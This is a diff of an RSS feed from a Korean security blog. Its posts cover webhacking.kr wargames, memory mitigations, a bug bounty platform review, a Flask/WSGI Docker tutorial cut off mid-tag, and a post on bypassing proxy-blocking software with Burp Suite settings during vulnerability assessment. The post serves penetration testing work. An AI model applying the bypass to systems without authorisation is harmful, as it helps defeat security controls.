+      <pubDate>Sat, 10 Jul 2021 11:55:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Webhacking.kr - 웹 해킹 관련 문제 풀이 워게임 사이트라고 많이 알려져들 있죠&lt;/p&gt;
+&lt;p&gt;예전에는 oldzomebie 님이 운</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>Webhacking.kr - 웹 해킹 관련 문제 풀이 워게임 사이트라고 많이 알려져들 있죠</p><p>예전에는 oldzomebie 님이 운영을 하신걸로 알고있고 최근에는 rubiya님이 운영을 하고 있다고 합니다!</p><p>그러면서 새롭게 추가된 문제들도 많이 보이는데요..? (아래 사진과 같이)</p><p><img src="/img/post/webhackingkr_renew/challenge.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>문제들을 잠깐잠깐 보고 지나갔었는데 트렌드가 계속 변화하는 만큼 해킹 기술도 발전하니.. 이에 맞춰서</p><p>rubiya님이 재미있는 문제들로 많이 구성을 해두신 것 같습니다 ㅎㅎ..</p><p>요즘은 회사일 때문에 바빠서 블로그에 글을 잘 못쓰고 있는데 주말이라는 시간을 활용해서 새 문제들이</p><p>어떤 문제이고, 어떤 기법을 활용했는지 등을 <code>Write up</code> 과 함께 준비하려고 합니다!</p><p>그럼. Coming soon~</p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web-Hacking/">Web Hacking</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Wargame/">Wargame</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/webhacking-kr/">webhacking.kr</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/07/10/webhackingkr-renew-0710/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Memory Mitigation - ASLR</title>
+      <link>https://blog.jhyeon.dev/2021/07/05/memory-mitigation-2/</link>
+      <guid>https://blog.jhyeon.dev/2021/07/05/memory-mitigation-2/</guid>
+      <pubDate>Sun, 04 Jul 2021 23:17:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Link&quot;&gt;&lt;a href=&quot;#Link&quot; class=&quot;headerlink&quot; title=&quot;Link&quot;&gt;&lt;/a&gt;Link&lt;/h3&gt;&lt;p&gt;아래 링크에 접속하시면 게시글을 보실 수 있습니다!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/img/post/memory</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p>아래 링크에 접속하시면 게시글을 보실 수 있습니다!</p><p><img src="/img/post/memory_mitigation/aslr.png" class="lazyload" data-srcset="/img/post/memory_mitigation/aslr.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p><a href="https://www.notion.so/jhyeon/Linux-Memory-Mitigation-ASLR-3a2502b5eebe4d8b86ce88805361a4e1">바로가기(Notion)</a></p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Pwnable/">Pwnable</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95/">메모리 보호기법</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Memory-Mitigation/">Memory Mitigation</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/ASLR/">ASLR</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/07/05/memory-mitigation-2/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Memory Mitigation - RELRO</title>
+      <link>https://blog.jhyeon.dev/2021/07/04/memory-mitigation-1/</link>
+      <guid>https://blog.jhyeon.dev/2021/07/04/memory-mitigation-1/</guid>
+      <pubDate>Sun, 04 Jul 2021 00:39:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Link&quot;&gt;&lt;a href=&quot;#Link&quot; class=&quot;headerlink&quot; title=&quot;Link&quot;&gt;&lt;/a&gt;Link&lt;/h3&gt;&lt;p&gt;아래 링크에 접속하시면 게시글을 보실 수 있습니다!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/img/post/memory</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p>아래 링크에 접속하시면 게시글을 보실 수 있습니다!</p><p><img src="/img/post/memory_mitigation/relro.png" class="lazyload" data-srcset="/img/post/memory_mitigation/relro.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p><a href="https://www.notion.so/jhyeon/Linux-Memory-Mitigation-RELRO-5e6e7da5e44944bd86456d3033620d68">바로가기(Notion)</a></p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Pwnable/">Pwnable</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95/">메모리 보호기법</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Memory-Mitigation/">Memory Mitigation</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/RELRO/">RELRO</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/07/04/memory-mitigation-1/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>해킹존(HackingZone) 국내 버그바운티 플랫폼 리뷰</title>
+      <link>https://blog.jhyeon.dev/2021/07/04/hackingzone-210704/</link>
+      <guid>https://blog.jhyeon.dev/2021/07/04/hackingzone-210704/</guid>
+      <pubDate>Sun, 04 Jul 2021 00:34:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;버그-바운티란&quot;&gt;&lt;a href=&quot;#버그-바운티란&quot; class=&quot;headerlink&quot; title=&quot;버그 바운티란?&quot;&gt;&lt;/a&gt;버그 바운티란?&lt;/h3&gt;&lt;p&gt;기업의 서비스나 제품 등을 해킹하여 취약점을 발견한 화이트 해커에게 포상금을 지급하는 </description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="버그-바운티란"><a href="#버그-바운티란" class="headerlink" title="버그 바운티란?"></a>버그 바운티란?</h3><p>기업의 서비스나 제품 등을 해킹하여 취약점을 발견한 화이트 해커에게 포상금을 지급하는 제도.</p><p>대표적으로 넷플릭스, 구글, 애플, 스타벅스, 페이스북 등 글로벌 유명기업도 다수 진행하고 있으며</p><p>국내 기업에도 삼성, 네이버, 리디북스 등 자발적으로 버그 바운티 시장에 참여하는 기업이</p><p>증가하고 있습니다.</p><h3 id="참여-방법"><a href="#참여-방법" class="headerlink" title="참여 방법"></a>참여 방법</h3><p>국내에는 대표적으로 제보하는 사이트가 한국인터넷진흥원(KISA)와 최근에 오픈된 해킹존 플랫폼이</p><p>존재합니다. 이외에도 자사 기업 서비스 취약점을 제보하는 <code>네이버</code>,<code>리디북스</code> 등 기업에서도</p><p>자발적으로 버그바운티 제도를 시행하고 있는 추세입니다.</p><h3 id="해킹존이란"><a href="#해킹존이란" class="headerlink" title="해킹존이란?"></a>해킹존이란?</h3><p>해킹존 플랫폼도 위 설명한 플랫폼들과 같이 기업 서비스, 제품들에 대해 취약점을 제보를 받아</p><p>포상금을 지급하는 <code>국내 버그바운티 플랫폼</code> 입니다.</p><p>해킹존만의 차이점이라고 한다면 자사 서비스만이 아닌 국내 스타트업, 중소기업, 대기업과 협력해</p><p>다양한 기업들의 서비스, 제품들의 취약점을 찾고 이를 제보할 수 있도록 하고 있고</p><p>본인도 이런 장점이 편리해서 국내 버그바운티를 할 때는 해킹존 플랫폼을 주로 사용합니다.</p><h3 id="해킹존에-대해서-알아보자"><a href="#해킹존에-대해서-알아보자" class="headerlink" title="해킹존에 대해서 알아보자"></a>해킹존에 대해서 알아보자</h3><ul><li>해킹존 홈페이지 : <a href="https://hackingzone.net/">https://hackingzone.net</a></li></ul><p><img src="/img/post/hackingzone/hackingzone.png" class="lazyload" data-srcset="/img/post/hackingzone/hackingzone.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="hackingzone"></p><p>해킹존 홈페이지에 들어가면 우선 이렇게 사용자 친화적인 UI/UX 인터페이스를 뽐내고 있습니다.</p><p>전체 진행중인 버그 바운티 프로그램에 대해서 목록화가 되어있고, 오른쪽에는 리포터 랭킹이라고</p><p>취약점을 제보하여 포상금 또는 포인트를 얻은 사용자의 순위를 보여주고 있습니다.</p><p><img src="/img/post/hackingzone/hzone2.png" class="lazyload" data-srcset="/img/post/hackingzone/hzone2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="hackingzone2"></p><p><img src="/img/post/hackingzone/hzone3.png" class="lazyload" data-srcset="/img/post/hackingzone/hzone3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="hackingzone3"></p><p>이제 프로그램 별 버그 바운티 페이지가 어떻게 구성되어있는지 보면,</p><p>사진과 같이 <code>프로그램 명</code> <code>최대 지급 포인트</code> <code>최대 포상금</code> <code>제보된 취약점</code> <code>진행 기간</code></p><p>이렇게 한눈에 알아볼 수 있도록 정보가 표시되어 있구요.</p><p>아래에는 프로그램 소개라해서 해당 서비스가 어떤 서비스인지 간단하게 소개해주고 있고</p><p>아래에는 취약점 제보 관련해서 안내 사항을 기록한 내용입니다.</p><p>글로싸인 같은 경우 빨간글씨로 취약점 제외 대상 홈페이지를 명시해두었는데 이부분을 해석하면</p><p>간혹 취약점 대상 사이트가 아닌곳을 접근하여 공격 시도를 하시는 분들이 많나봅니다 ㅎㅎ..</p><hr><p>그리고 마지막으로는 취약점 제보 관련해서 제약 사항들로 표시됩니다.</p><p>취약점 제보를 하되 포상이 제외되는 항목을 나열한것이고 이 항목들에 연관이 된다면</p><p>취약점이 인정이 되도 포상은 안되겠죠? ㅎㅎ</p><p><img src="/img/post/hackingzone/hzone4.png" class="lazyload" data-srcset="/img/post/hackingzone/hzone4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="hackingzone4"></p><p>이건 조금 신선했던 기능인데 중복 취약점 제보를 막기위해서 대상 서비스에 어떤 취약점이</p><p>제보되었는지 제목, 제보시간을 공개하면서 ~~ 취약점이 있었구나하면서 중복 제보 하는것을 조금</p><p>줄일수도 있을 것이고, 어떻게 보면 조금 더 넓은 시각으로 보면서 다르게 접근해서 또 새로운</p><p>취약점을 찾아낼 수도 있는 것이지요! 아무튼 이 기능은 매우 좋은 것 같습니다.</p><p><img src="/img/post/hackingzone/hzone5.png" class="lazyload" data-srcset="/img/post/hackingzone/hzone5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="hackingzone5"></p><p>마지막으로 소개할 기능인데 <code>MY 리포트</code> 라고해서 본인이 제보한 취약점 항목, 포상금 지급 내역</p><p>취약점 제보 이후 처리되고 있는 과정들을 간단하게 볼 수 있는 페이지에요~</p><p>제보한 취약점들을 다시 볼 수 있도록 되어 있어서 나중에 찾아야 하는 일이 생기더라도</p><p>MY 리포트 페이지를 통해서라면 쉽고 빠르게 확인할 수 있습니다 ~!</p><p><img src="/img/post/hackingzone/hzone6.png" class="lazyload" data-srcset="/img/post/hackingzone/hzone6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="hackingzone6"></p><p>마지막으로 소개할 취약점 제보 페이지입니다! 저도 여태껏 KISA쪽 버그 바운티만 했다보니</p><p>취약점을 제보할 때 직접 HWP 양식대로 보고서를 작성해야 했는데 해킹존 플랫폼은</p><p>자체적인 제보 페이지 관리 및 운영을 하고 계셔서 더욱더 쉽게 취약점을 제보할 수 있답니다~</p><p>제목, 공격 유형, 공격 영향, 취약점 설명, 조치방안, 첨부파일 등 꽤 다양한 항목들을</p><p>입력할 수 있도록 되어있고 디테일하게 설명되어 있어서 어렵지 않게 작성할 수 있답니다.</p><p><img src="/img/post/hackingzone/hzone7.png" class="lazyload" data-srcset="/img/post/hackingzone/hzone7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="hackingzone7"></p><p>요것은 제보 페이지 마지막 섹션에 있는 부분인데 처음 버그 바운티를 하시는 분들은</p><p>잘 모르실 수 있는 비밀 협의 조항입니다! 취약점을 제보하고나서 어떠한 경로라도 외부에</p><p>관련 내용을 유출하게 되면 정보통신망법에 의거하여 처벌을 받게됩니다.</p><p>이는 다른 버그 바운티를 진행하는 서비스에도 공통적인 항목이며 꼭 지켜주셔야 합니다!</p><h3 id="마무리"><a href="#마무리" class="headerlink" title="마무리"></a>마무리</h3><p>이전에도 해킹존쪽에서 연락이 오셔서 인터뷰 요청을 해주셨는데 해킹존 플랫폼분들이</p><p>다들 친절하시고 사용자 입장에서 해킹존 플랫폼 발전을 위해 여러가지 의견도 적극적으로</p><p>들어주셨습니다 ㅎㅎ. 향후 해킹존의 방향이 매우 기대가 되고 있고 널리 알려져서</p><p>국내 버그바운티 시장이 규모가 확대되었으면 좋겠습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/KISA/">KISA</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EC%82%BC%EC%84%B1SDS/">삼성SDS</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EB%B2%84%EA%B7%B8-%EB%B0%94%EC%9A%B4%ED%8B%B0/">버그 바운티</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Bug-Bounty/">Bug Bounty</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%9C%EB%B3%B4/">취약점 제보</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9%EC%A1%B4/">해킹존</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/07/04/hackingzone-210704/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Proxy Bypass Technologies</title>
+      <link>https://blog.jhyeon.dev/2021/05/26/proxybypass-210525/</link>
+      <guid>https://blog.jhyeon.dev/2021/05/26/proxybypass-210525/</guid>
+      <pubDate>Tue, 25 May 2021 15:10:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;이번 글에서는 웹 프록시 도구로 취약점을 진단할 때 이러한 프록시 설정이 차단되어 있을 경우를 가정하여&lt;</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>이번 글에서는 웹 프록시 도구로 취약점을 진단할 때 이러한 프록시 설정이 차단되어 있을 경우를 가정하여</p><p>우회(Bypassing) 하는 방법을 작성해보고자 합니다.</p><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>첫 번째로 Burp Suite 프록시 도구를 통해 진단을 하는 경우에는 <code>Request Handling</code> 기능을 사용할 수 있습니다.</p><p>Proxy 기본 설정 옵션에 존재하며 해당 기능을 사용하면 예를 들어 jhyeon.com 으로 요청을 했을 때 Redirection</p><p>과정을 거쳐 타겟(대상) URL로 이동하기 때문에 프록시 차단 솔루션이 브라우저를 향해 바라보고 있다면 이러한</p><p>요청 처리(Request Handling)을 통해 프록시 차단 우회가 가능합니다.</p><p>설정 방법은 다음과 같습니다.</p><p><img src="/img/post/proxybypass/burp1.png" class="lazyload" data-srcset="/img/post/proxybypass/burp1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo1"></p><p>Burp Suite - Proxy - Options - Proxy Listeners 탭에서 기존에 설정된 프록시 설정을</p><p>편집(Edit)모드로 들어가 Request Handling 설정을 하면 됩니다. 이 때 Redirect to Host 값에는</p><p>프록시을 우회하고 들어갈 타겟(대상) URL을 입력해주신 뒤 저장을 하시고,</p><p><img src="/img/post/proxybypass/burp2.png" class="lazyload" data-srcset="/img/post/proxybypass/burp2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo2"></p><p>아래 Match and Replace 옵션에서 Host Header 값을 사진과 같이 설정해주셔야 합니다.</p><p>Match에는 임의로 접속할 URL주소, Replace에는 변경할 헤더 즉, 타겟(대상) URL 주소가 됩니다.</p><h3 id="Etc"><a href="#Etc" class="headerlink" title="Etc"></a>Etc</h3><p>이외에도 크롬 확장 프로그램으로 지원하는 <code>Proxy SwitchyOmega</code> 툴이 있습니다.</p><p>Burp Suite, Fidder 등이 패킷을 직접 캡처하고 송/수신 하는 용도라면 해당 도구는 브라우저와 프록시 서버 간</p><p>통신을 위해 사용하는 프록시 도구입니다.</p><p>다운로드 : <a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif">Chrome Store</a></p><p>위 크롬 스토어 링크에서 다운로드 하여 확장 프로그램에 추가한 뒤 사용할 수 있습니다.</p><p><img src="/img/post/proxybypass/proxytool.png" class="lazyload" data-srcset="/img/post/proxybypass/proxytool.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo3"></p><p>위 사진과 같이 설정을 하면 <code>127.0.0.1:8080</code> 로컬 서버를 프록시 서버로 경유시켜 패킷을 전송시킬 수 있습니다.</p><p>물론, Burp Suite와 설정을 맞추어 패킷을 캡처하여 전송시키는 것도 가능합니다.</p><p>아직 해당 도구에 대한 경험이 그렇게 많지는 않아서 더 좋은 사용 사례나 도구들이 있다면 추가로 포스팅 하겠습니다!</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://normaltic.com/%EC%95%88%EB%9E%A9%EC%9C%BC%EB%A1%9C-%EB%B6%80%ED%84%B0-%EB%8B%B9%EB%8B%B9%ED%95%98%EC%9E%90-%EC%9A%B0%ED%9A%8C-%EA%B8%B0%EC%88%A0-astx-e2e-bypass/">ASTX E2E Bypass</a></li></ul>]]></content:encoded>
+      
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/">모의해킹</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EC%9B%B9-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/">웹 모의해킹</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EC%9B%B9-%ED%95%B4%ED%82%B9/">웹 해킹</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Burp-Suite/">Burp Suite</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Fiddler/">Fiddler</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Proxy/">Proxy</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Proxy-Bypass/">Proxy Bypass</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/05/26/proxybypass-210525/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Python Flask + WSGI 사용하기</title>
+      <link>https://blog.jhyeon.dev/2021/05/21/flask-apache-210521/</link>
+      <guid>https://blog.jhyeon.dev/2021/05/21/flask-apache-210521/</guid>
+      <pubDate>Thu, 20 May 2021 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;이번 글에서는 Python Flask 환경에서 WSGI를 사용해 Apache2 웹 서버 엔진과 연동하는&lt;</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>이번 글에서는 Python Flask 환경에서 WSGI를 사용해 Apache2 웹 서버 엔진과 연동하는</p><p>방법에 대해서 글을 작성해보고자 한다.</p><h2 id="WSGI란"><a href="#WSGI란" class="headerlink" title="WSGI란?"></a>WSGI란?</h2><p>WSGI(Web Server Gateway Interface)로 파이썬에서 웹 어플리케이션이 서버와 통신하기 위한 인터페이스를 의미한다.</p><p>즉, 웹 서버가 받은 요청을 Python Application 으로 넘겨주고 응답을 반환받는 호출 조약(Calling Converstation)이다.</p><h2 id="WSGI를-왜-사용하는가"><a href="#WSGI를-왜-사용하는가" class="headerlink" title="WSGI를 왜 사용하는가?"></a>WSGI를 왜 사용하는가?</h2><p><img src="/img/post/wsgi/wsgi_browser.jpg" class="lazyload" data-srcset="/img/post/wsgi/wsgi_browser.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo1"></p><p>Flask 같은 경우 Restful API 서비스에 사용되거나 하는 가장 최소한의 기능들을 포함한 웹 프레임 워크입니다.</p><p>기본적으로 한번에 최대 하나의 요청까지만을 처리하기 때문에 실제 웹 서비스를 배포하는 경우,</p><p>Flask를 단일로 구성해서 배포하는 것은 올바르지 않은 것이고</p><p>주로 WSGI를 사용해서 중간에 웹 서버 엔진(nginx, apache 등)을 경유할 수 있도록 하는 것이 좋습니다.</p><h2 id="WSGI-Middleware"><a href="#WSGI-Middleware" class="headerlink" title="WSGI Middleware"></a>WSGI Middleware</h2><p><img src="/img/post/wsgi/wsgi.png" class="lazyload" data-srcset="/img/post/wsgi/wsgi.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo2"></p><p>사진으로 매우 간결하게 정리되어있는데 Private Physical Server 위에 그려진 모든 내용을</p><p>WAS(Web Application Server)라고 명칭합니다.</p><p>그리고 WSGI Module, Process를 합쳐서 <code>WSGI Middleware</code> 라고 부르게 되고 WSGI 전용 프로토콜을 사용합니다.</p><p>이러한 WSGI Middleware는 웹 서버(Web Server)와 어플리케이션(Application)을 서로 연결시켜주는 역할을 합니다.</p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>이번 글에서는 flask+uwsgi+nginx를 사용한 웹 어플리케이션 구동 과정과,</p><p>flask+wsgi+apache2를 사용한 구동 과정을 정리할 것이다.</p><h3 id="NGINX"><a href="#NGINX" class="headerlink" title="NGINX"></a>NGINX</h3><p>예전에는 uwsgi를 통해 직접 nginx 환경을 세팅해야 했지만 요즘에는 <code>docker</code>를 통해서</p><p>flask+uwsgi+nginx 패키지를 묶어둔 도커 이미지가 있기 때문에 사용이 조금 더 편리해진 감이 있다.</p><p>(<a href="https://hub.docker.com/r/tiangolo/uwsgi-nginx-flask">https://hub.docker.com/r/tiangolo/uwsgi-nginx-flask</a>)</p><p>우선 파일 트리는 다음 사진과 같다.</p><p><img src="/img/post/wsgi/nginx_tree.png" class="lazyload" data-srcset="/img/post/wsgi/nginx_tree.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo3"></p><p>프로젝트 폴더(NGINX)에 dockerfile, docker-compose.yml 파일을 두고</p><p>web 폴더를 하나 생성해서 실제 flask 앱을 구동할 파일들을 넣어줬다.</p><p><code>dockerfile</code></p><pre><code class="docker">FROM tiangolo/uwsgi-nginx-flask:python3.8COPY ./web /app</code></pre><p><code>docker-compose.yml</code></p><pre><code class="docker">version: &#39;3.7&#39;services:    nginx-wsgi:        build: ./        container_name: nginx-wsgi        ports:            - 80:80</code></pre><p><code>main.py</code></p><pre><code class="py">from flask import Flaskapp = Flask(__name__)@app.route(&#39;/&#39;, methods=[&quot;GET&quot;])def index():    return &#39;hello world!&#39;if __name__ == &quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;, port=80, debug=False)</code></pre><p>이렇게 구성해주고 아래 명령어로 도커 이미지를 빌드시키면 된다.</p><p><code>docker-compose up -d --build</code></p><p><img src="/img/post/wsgi/nginx_run.png" class="lazyload" data-srcset="/img/post/wsgi/nginx_run.png" 